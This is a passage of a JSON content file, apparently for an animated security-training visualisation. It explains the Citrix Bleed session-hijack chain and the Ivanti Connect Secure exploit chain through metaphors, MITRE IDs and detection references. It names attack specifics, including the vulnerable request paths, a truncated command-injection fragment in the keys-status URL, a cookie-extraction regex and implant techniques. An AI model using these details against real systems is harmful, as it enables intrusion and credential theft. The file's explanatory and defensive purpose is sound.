          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Coat",
          "stageTag": "STAGE 03 · LATERAL & C2",
          "title": "CITRIX ICA VDI LAUNCH & INTERNAL AD RECONNAISSANCE",
          "storyExcerpt": "Seated inside the hijacked manager workspace, the outsider picks up the internal office intercom and issues remote administration orders to adjacent floor vaults across the corporate building.",
          "technicalParallel": "Unlike PsExec or sc.exe (which register a new Windows Service and trigger System EventID 7045 on the target server), lateral movement via DCOM MMC20.Application abuses an already-registered Microsoft COM…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Gateway Arch",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Ticket Counter",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Memory Bleed",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "splunk-citrix-bleed-session-hijack",
      "sectionKey": "step-1",
      "sceneKind": "net-citrix-bleed-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Sending an Oversized HTTP \"Host\" Header to Leak Adjacent NetScaler RAM (CVE-2023-4966)",
      "storyCue": "An outsider approaches the public information counter with an unusually long address label. While preparing the printed directory reply, the counter machine overruns its tray and dumps handfuls of neighboring scratch memory straight into the response.",
      "technicalCue": "T1190 · INITIAL ACCESS — As reverse-engineered by Assetnote, the attacker sends an unauthenticated HTTPS GET request to /oauth/idp/.well-known/openid-configuration (a public discovery page on the Citrix NetScaler…",
      "storyMappings": [
        {
          "storyTerm": "Public information counter",
          "technicalTerm": "Exposed OpenID discovery endpoint on NetScaler",
          "tone": "amber"
        },
        {
          "storyTerm": "Unusually long address label",
          "technicalTerm": "Oversized HTTP Host header triggering buffer over-read",
          "tone": "sky"
        },
        {
          "storyTerm": "Neighboring scratch memory",
          "technicalTerm": "Adjacent uninitialized heap memory disclosure",
          "tone": "rose"
        },
        {
          "storyTerm": "Thick printed reply",
          "technicalTerm": "Abnormally large HTTP 200 response exceeding 130 KB",
          "tone": "emerald"
        }
      ],
      "accentHex": "#22D3EE",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-citrix-bleed-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Public information counter",
          "subtitle": "Exposed OpenID discovery endpoint on NetScaler",
          "tone": "amber"
        },
        {
          "id": "net-citrix-bleed-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Unusually long address label",
          "subtitle": "Oversized HTTP Host header triggering buffer over-read",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Long",
          "stageTag": "STEP 01 · SETUP",
          "title": "Public information counter",
          "storyExcerpt": "An outsider approaches the public information counter with an unusually long address label.",
          "technicalParallel": "In the C standard library, snprintf(buf, size, fmt...) stops writing at size bytes to prevent a crash, but returns the theoretical total length of the formatted string.",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Long",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Unusually long address label",
          "storyExcerpt": "While preparing the printed directory reply, the counter machine overruns its tray and dumps handfuls of neighboring scratch memory straight into the response.",
          "technicalParallel": "As reverse-engineered by Assetnote, the attacker sends an unauthenticated HTTPS GET request to /oauth/idp/.well-known/openid-configuration (a public discovery page on the Citrix NetScaler Gateway whose…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Thick printed reply",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across thick printed reply while locking down neighboring scratch memory.",
          "technicalParallel": "Documented in Assetnote, CISA AA23-325A, and Suricata SID 2048918 (network detection signatures for Citrix Bleed): GET /oauth/idp/.well-known/openid-configuration with oversized Host header and >130 KB…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Gateway Arch",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Ticket Counter",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Memory Bleed",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "splunk-citrix-bleed-session-hijack",
      "sectionKey": "step-2",
      "sceneKind": "net-citrix-bleed-step-2",
      "stageBadge": "STEP #2 · CREDENTIAL ACCESS",
      "title": "Extracting the 65-Character \"NSC_AAAC\" Cookie & Hijacking an Active MFA Session",
      "storyCue": "Sifting through the spilled counter scraps, the outsider spots an active sixty-five-symbol coat claim ticket belonging to a signed-in manager. Presenting that copied ticket at the VIP entrance opens the manager desk immediately without any password or buzzer check.",
      "technicalCue": "T1539 · CREDENTIAL ACCESS — Scanning the leaked raw memory dump with a regular expression ([0-9a-f]{32,65}), the attacker extracts a 65-character hexadecimal string: a live NSC_AAAC session cookie (the master…",
      "storyMappings": [
        {
          "storyTerm": "Spilled counter scraps",
          "technicalTerm": "Raw leaked memory buffer contents",
          "tone": "amber"
        },
        {
          "storyTerm": "Sixty-five-symbol claim ticket",
          "technicalTerm": "Valid NSC_AAAC session cookie token",
          "tone": "sky"
        },
        {
          "storyTerm": "VIP entrance bypass",
          "technicalTerm": "Authenticated session hijack skipping MFA",
          "tone": "rose"
        },
        {
          "storyTerm": "Two separate entry gates",
          "technicalTerm": "Same session cookie observed from two distinct client IPs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#22D3EE",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-citrix-bleed-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Spilled counter scraps",
          "subtitle": "Raw leaked memory buffer contents",
          "tone": "amber"
        },
        {
          "id": "net-citrix-bleed-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Sixty-five-symbol claim ticket",
          "subtitle": "Valid NSC_AAAC session cookie token",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Coat",
          "stageTag": "STEP 02 · SETUP",
          "title": "Spilled counter scraps",
          "storyExcerpt": "Sifting through the spilled counter scraps, the outsider spots an active sixty-five-symbol coat claim ticket belonging to a signed-in manager.",
          "technicalParallel": "Because the NSC_AAAC cookie represents an active server-side AAA session in NetScaler memory, even patching the appliance or resetting the victim’s Active Directory password does not kick the attacker…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Vip Desk",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Sixty-five-symbol claim ticket",
          "storyExcerpt": "Presenting that copied ticket at the VIP entrance opens the manager desk immediately without any password or buzzer check.",
          "technicalParallel": "Scanning the leaked raw memory dump with a regular expression ([0-9a-f]{32,65}), the attacker extracts a 65-character hexadecimal string: a live NSC_AAAC session cookie (the master authentication token…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Two",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Two separate entry gates",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across two separate entry gates while locking down vip entrance bypass.",
          "technicalParallel": "Documented in Splunk SURGe and NetScaler AAA Syslog (ns.log session tracking records): Same NSC_AAAC session identifier active across two different client IP addresses / ASNs without a new authentication…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Gateway Arch",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Ticket Counter",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Memory Bleed",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1539"
    },
    "step-3": {
      "scenarioId": "splunk-citrix-bleed-session-hijack",
      "sectionKey": "step-3",
      "sceneKind": "net-citrix-bleed-step-3",
      "stageBadge": "STEP #3 · LATERAL & C2",
      "title": "Pivoting from the Hijacked Citrix VDI Desktop into Internal Servers via DCOM/RPC",
      "storyCue": "Seated inside the hijacked manager workspace, the outsider picks up the internal office intercom and issues remote administration orders to adjacent floor vaults across the corporate building.",
      "technicalCue": "T1550.004 · LATERAL & C2 — Inside the hijacked Citrix Virtual Desktop (VDI) session, the attacker runs Active Directory discovery tools (adfind / SoftPerfect netscan), deploys remote management tunnels (AnyDesk /…",
      "storyMappings": [
        {
          "storyTerm": "Hijacked manager workspace",
          "technicalTerm": "Active remote virtual desktop session",
          "tone": "amber"
        },
        {
          "storyTerm": "Internal office intercom",
          "technicalTerm": "Remote DCOM management interface",
          "tone": "sky"
        },
        {
          "storyTerm": "Remote administration order",
          "technicalTerm": "Spawned mmc.exe -Embedding execution on target hosts",
          "tone": "rose"
        },
        {
          "storyTerm": "Adjacent floor vaults",
          "technicalTerm": "Internal enterprise servers targeted during lateral movement",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-citrix-bleed-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Hijacked manager workspace",
          "subtitle": "Active remote virtual desktop session",
          "tone": "amber"
        },
        {
          "id": "net-citrix-bleed-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Internal office intercom",
          "subtitle": "Remote DCOM management interface",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Entry Beat",
          "stageTag": "STEP 03 · SETUP",
          "title": "Hijacked manager workspace",
          "storyExcerpt": "Seated inside the hijacked manager workspace, the outsider picks up the internal office intercom and issues remote administration orders to adjacent floor vaults across the corporate building.",
          "technicalParallel": "Unlike PsExec or sc.exe (which register a new Windows Service and trigger System EventID 7045 on the target server), lateral movement via DCOM MMC20.Application abuses an already-registered Microsoft COM…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Internal office intercom",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses internal office intercom to advance toward remote administration order.",
          "technicalParallel": "Inside the hijacked Citrix Virtual Desktop (VDI) session, the attacker runs Active Directory discovery tools (adfind / SoftPerfect netscan), deploys remote management tunnels (AnyDesk / eHorus), and uses…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Impact Beat",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Adjacent floor vaults",
          "storyExcerpt": "Behind the scenes, adjacent floor vaults captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in CISA AA23-325A and Mandiant (post-hijack lateral movement indicators): mmc.exe -Embedding spawned on remote servers via DCOM following Citrix ICA session IP change (linking the hijacked…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Gateway Arch",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Ticket Counter",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Memory Bleed",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1550.004"
    }
  },
  "splunk-ivanti-connect-secure": {
    "briefing": {
      "scenarioId": "splunk-ivanti-connect-secure",
      "sectionKey": "briefing",
      "sceneKind": "net-ivanti-cs-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Ivanti Connect Secure (UNC5221): Auth Bypass, RCE & ZIPLINE Backdoor — Story-to-Technical Overview",
      "storyCue": "A secure commuter tunnel checks entry badges at the main turnstile, but a side stairwell lets someone step back a hallway and walk into the control booth unchallenged. Once inside, the intruder writes a hidden command into the license meter and alters three permanent booth manuals so every future inspection still reports all systems normal.",
      "technicalCue": "INITIAL ACCESS: PATH TRAVERSAL AUTH BYPASS & RCE (CVE-2023-46805 + CVE-2024-21887) -> PERSISTENCE: ZIPLINE ELF BACKDOOR IN LIBDSUPGRADE.SO & CAV TAMPERING -> CREDENTIAL ACCESS: DSLOG.PM CREDENTIAL HARVESTING & INTERNAL TUNNELING",
      "storyMappings": [
        {
          "storyTerm": "Commuter tunnel gate",
          "technicalTerm": "Ivanti Connect Secure VPN gateway appliance",
          "tone": "amber"
        },
        {
          "storyTerm": "Side stairwell shortcut",
          "technicalTerm": "Path traversal authentication bypass (CVE-2023-46805)",
          "tone": "sky"
        },
        {
          "storyTerm": "License meter dial",
          "technicalTerm": "Command injection in keys-status endpoint (CVE-2024-21887)",
          "tone": "rose"
        },
        {
          "storyTerm": "Altered booth manuals",
          "technicalTerm": "Persistent web, library, and integrity-checker implants",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-ivanti-cs-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Commuter tunnel gate",
          "subtitle": "Ivanti Connect Secure VPN gateway appliance",
          "tone": "amber"
        },
        {
          "id": "net-ivanti-cs-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Side stairwell shortcut",
          "subtitle": "Path traversal authentication bypass (CVE-2023-46805)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Gate",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "PATH TRAVERSAL AUTH BYPASS & RCE (CVE-2023-46805 + CVE-2024-21887)",
          "storyExcerpt": "An outsider knocks on a public helper window and adds backward hallway steps onto the room number. The door guard checks only the starting corridor and waves the visitor straight into the restricted…",
          "technicalParallel": "Because the authentication filter checked the raw un-normalized URI prefix (startswith(\"/api/v1/totp/user-backup-code\")) before the backend web framework normalized \"../\" segments (CVE-2023-46805), any…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Side",
          "stageTag": "STAGE 02 · PERSISTENCE",
          "title": "ZIPLINE ELF BACKDOOR IN LIBDSUPGRADE.SO & CAV TAMPERING",
          "storyExcerpt": "Inside the control booth, the visitor types a semicolon and extra workshop orders directly into the license status gauge. The gauge passes the raw text straight to the basement machinery, granting…",
          "technicalParallel": "Why did the attacker chain two CVEs? Because CVE-2024-21887 (command injection in keys-status) normally required an administrator login, and CVE-2023-46805 (path traversal) only bypassed authentication…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Log Page",
          "stageTag": "STAGE 03 · CREDENTIAL ACCESS",
          "title": "DSLOG.PM CREDENTIAL HARVESTING & INTERNAL TUNNELING",
          "storyExcerpt": "Before leaving, the intruder edits a visitor log page to accept secret requests, inserts a quiet traffic filter ahead of normal booth tools, and rewrites the safety inspector checklist so internal…",
          "technicalParallel": "As Mandiant UNC5221 documented, the threat actor also patches ComponentIntegrity.pm (so Ivanti’s built-in Integrity Checker Tool reports \"0 modified files\" when an admin runs an internal self-check…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tunnel Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Side Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Bypass Path",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "splunk-ivanti-connect-secure",
      "sectionKey": "step-1",
      "sceneKind": "net-ivanti-cs-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Bypassing Authentication With ../../ Traversal Through /api/v1/totp/user-backup-code/ (CVE-2023-46805)",
      "storyCue": "An outsider knocks on a public helper window and adds backward hallway steps onto the room number. The door guard checks only the starting corridor and waves the visitor straight into the restricted control booth.",
      "technicalCue": "T1190 · INITIAL ACCESS — In Ivanti Connect Secure, the outer web gatekeeper checks whether a requested URL starts with a public prefix like /api/v1/totp/user-backup-code/ (an endpoint that must be reachable before…",
      "storyMappings": [
        {
          "storyTerm": "Public helper window",
          "technicalTerm": "Unauthenticated backup-code API path prefix",
          "tone": "amber"
        },
        {
          "storyTerm": "Backward hallway steps",
          "technicalTerm": "Relative ../ directory traversal path segments",
          "tone": "sky"
        },
        {
          "storyTerm": "Restricted control booth",
          "technicalTerm": "Protected internal administrative REST endpoints",
          "tone": "rose"
        },
        {
          "storyTerm": "Tunnel door guard",
          "technicalTerm": "Gateway URL route authorization filter",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-ivanti-cs-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Public helper window",
          "subtitle": "Unauthenticated backup-code API path prefix",
          "tone": "amber"
        },
        {
          "id": "net-ivanti-cs-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Backward hallway steps",
          "subtitle": "Relative ../ directory traversal path segments",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Adds Onto",
          "stageTag": "STEP 01 · SETUP",
          "title": "Public helper window",
          "storyExcerpt": "An outsider knocks on a public helper window and adds backward hallway steps onto the room number.",
          "technicalParallel": "Because the authentication filter checked the raw un-normalized URI prefix (startswith(\"/api/v1/totp/user-backup-code\")) before the backend web framework normalized \"../\" segments (CVE-2023-46805), any…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Door Only",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Backward hallway steps",
          "storyExcerpt": "The door guard checks only the starting corridor and waves the visitor straight into the restricted control booth.",
          "technicalParallel": "In Ivanti Connect Secure, the outer web gatekeeper checks whether a requested URL starts with a public prefix like /api/v1/totp/user-backup-code/ (an endpoint that must be reachable before login so users…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Door",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Tunnel door guard",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across tunnel door guard while locking down restricted control booth.",
          "technicalParallel": "Documented in CISA ED 24-01 and Splunk SURGe (emergency federal directive and detection rules for gateway traversal): HTTP requests containing /api/v1/totp/user-backup-code/.. or…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tunnel Gate",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Side Chute",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Bypass Path",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "splunk-ivanti-connect-secure",
      "sectionKey": "step-2",
      "sceneKind": "net-ivanti-cs-step-2",
      "stageBadge": "STEP #2 · PERSISTENCE",
      "title": "Injecting Shell Commands Into keys-status URL Parameters (CVE-2024-21887)",
      "storyCue": "Inside the control booth, the visitor types a semicolon and extra workshop orders directly into the license status gauge. The gauge passes the raw text straight to the basement machinery, granting instant full control.",
      "technicalCue": "T1574.006 · PERSISTENCE — Once the path-traversal request reaches /api/v1/license/keys-status/;python%20-c%20..., the backend Python handler takes the URL parameter and passes it directly into subprocess.Popen(...…",
      "storyMappings": [
        {
          "storyTerm": "License status gauge",
          "technicalTerm": "Internal /api/v1/license/keys-status/ parameter",
          "tone": "amber"
        },
        {
          "storyTerm": "Semicolon extra order",
          "technicalTerm": "OS command injection payload (CVE-2024-21887)",
          "tone": "sky"
        },
        {
          "storyTerm": "Basement machinery",
          "technicalTerm": "Underlying Linux shell spawned by web daemon",
          "tone": "rose"
        },
        {
          "storyTerm": "Control booth intercom",
          "technicalTerm": "Appliance syslog and unallocated access logs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-ivanti-cs-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "License status gauge",
          "subtitle": "Internal /api/v1/license/keys-status/ parameter",
          "tone": "amber"
        },
        {
          "id": "net-ivanti-cs-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Semicolon extra order",
          "subtitle": "OS command injection payload (CVE-2024-21887)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Raw Text",
          "stageTag": "STEP 02 · SETUP",
          "title": "License status gauge",
          "storyExcerpt": "Inside the control booth, the visitor types a semicolon and extra workshop orders directly into the license status gauge.",
          "technicalParallel": "Why did the attacker chain two CVEs? Because CVE-2024-21887 (command injection in keys-status) normally required an administrator login, and CVE-2023-46805 (path traversal) only bypassed authentication…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Raw Text",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Semicolon extra order",
          "storyExcerpt": "The gauge passes the raw text straight to the basement machinery, granting instant full control.",
          "technicalParallel": "Once the path-traversal request reaches /api/v1/license/keys-status/;python%20-c%20..., the backend Python handler takes the URL parameter and passes it directly into subprocess.Popen(..., shell=True)…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Down",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Control booth intercom",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across control booth intercom while locking down basement machinery.",
          "technicalParallel": "Documented by Volexity and Mandiant (incident investigations of chained gateway compromises): Ivanti unallocated log / syslog entries showing /api/v1/license/keys-status/; followed by unexpected child…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tunnel Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Side Chute",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Bypass Path",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1574.006"
    },
    "step-3": {
      "scenarioId": "splunk-ivanti-connect-secure",
      "sectionKey": "step-3",
      "sceneKind": "net-ivanti-cs-step-3",
      "stageBadge": "STEP #3 · CREDENTIAL ACCESS",
      "title": "Implanting \"WIREFIRE\" in visits.py, \"ZIPLINE\" via LD_PRELOAD & \"WARPWIRE\" Credential Stealer",
      "storyCue": "Before leaving, the intruder edits a visitor log page to accept secret requests, inserts a quiet traffic filter ahead of normal booth tools, and rewrites the safety inspector checklist so internal self-audits report a clean bill of health.",
      "technicalCue": "T1556 · CREDENTIAL ACCESS — Synthesizing Volexity (UTA0178) and Mandiant (UNC5221) findings, with root access on the VPN appliance the attacker runs mount -o remount,rw / (temporarily unlocking the appliance’s read-only…",
      "storyMappings": [
        {
          "storyTerm": "Edited visitor log page",
          "technicalTerm": "WIREFIRE web backdoor inside visits.py",
          "tone": "amber"
        },
        {
          "storyTerm": "Quiet traffic filter",
          "technicalTerm": "ZIPLINE passive interceptor via LD_PRELOAD",
          "tone": "sky"
        },
        {
          "storyTerm": "Rewritten inspector checklist",
          "technicalTerm": "Tampered ComponentIntegrity.pm checker module",
          "tone": "rose"
        },
        {
          "storyTerm": "External auditor snapshot",
          "technicalTerm": "Out-of-band Integrity Checker Tool verification",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-ivanti-cs-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Edited visitor log page",
          "subtitle": "WIREFIRE web backdoor inside visits.py",
          "tone": "amber"
        },
        {
          "id": "net-ivanti-cs-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Quiet traffic filter",
          "subtitle": "ZIPLINE passive interceptor via LD_PRELOAD",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Log Page",
          "stageTag": "STEP 03 · SETUP",
          "title": "Edited visitor log page",
          "storyExcerpt": "Before leaving, the intruder edits a visitor log page to accept secret requests, inserts a quiet traffic filter ahead of normal booth tools, and rewrites the safety inspector checklist so…",
          "technicalParallel": "As Mandiant UNC5221 documented, the threat actor also patches ComponentIntegrity.pm (so Ivanti’s built-in Integrity Checker Tool reports \"0 modified files\" when an admin runs an internal self-check…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Quiet traffic filter",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses quiet traffic filter to advance toward rewritten inspector checklist.",
          "technicalParallel": "Synthesizing Volexity (UTA0178) and Mandiant (UNC5221) findings, with root access on the VPN appliance the attacker runs mount -o remount,rw / (temporarily unlocking the appliance’s read-only system…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Log Page",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "External auditor snapshot",
          "storyExcerpt": "Behind the scenes, external auditor snapshot captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Volexity (UTA0178) and Mandiant (UNC5221) (forensic artifact lists for persistent gateway backdoors): modification of visits.py, libsecure.so (ZIPLINE), and ComponentIntegrity.pm discovered…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tunnel Gate",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Side Chute",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Bypass Path",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1556"
    },
    "memory-forensics": {
      "scenarioId": "splunk-ivanti-connect-secure",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-ivanti-cs-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
